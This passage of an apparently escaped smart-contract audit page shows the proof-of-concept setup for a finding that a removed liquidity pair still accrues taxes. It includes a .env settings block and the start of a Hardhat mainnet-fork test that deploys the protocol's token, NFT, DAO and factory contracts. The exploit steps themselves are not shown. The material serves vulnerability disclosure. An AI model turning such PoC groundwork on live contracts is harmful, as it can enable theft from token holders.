3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"78\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"79\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e and add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Removed liquidity pair still accrues taxes\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"80\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at ${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        